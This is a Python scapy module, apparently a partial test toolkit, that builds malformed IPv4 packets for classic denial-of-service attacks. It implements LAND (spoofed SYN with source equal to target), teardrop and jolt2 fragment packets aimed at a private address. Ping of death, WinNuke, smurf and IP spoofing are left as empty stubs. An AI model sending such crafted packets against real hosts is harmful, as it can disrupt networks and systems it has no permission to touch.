# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> ipv4_exception_packets.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/28 14:34

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

from scapy.all import *


def ping_of_death():
    pass


def land_base(smac, target):
    data_link_layer = Ether(
        src = smac
    )
    network_layer = IP(
        src = target,
        dst = target
    )
    transport_layer = TCP(
        sport = random.randint(1000, 65535),
        dport = random.randint(1000, 65535),
        flags = "S"
    )
    pkt = network_layer / transport_layer
    return pkt


def tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
    network_layer = IP(
        id = 28752,
        flags = flags,
        frag = frag,
        ttl = 128,
        proto = proto,
        dst = dst
    )
    data = data
    pkt = network_layer / data
    return pkt


def tcp_flag():
    pass


def winnuke():
    pass


def smurf():
    pass


def ip_option():
    pass


def ip_spoof():
    pass


def jolt2(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
    network_layer = IP(
        id=28752,
        flags=flags,
        frag=frag,
        ttl=128,
        proto=proto,
        dst=dst
    )
    data = data
    pkt = network_layer / data
    return pkt


def tcp_sack():
    pass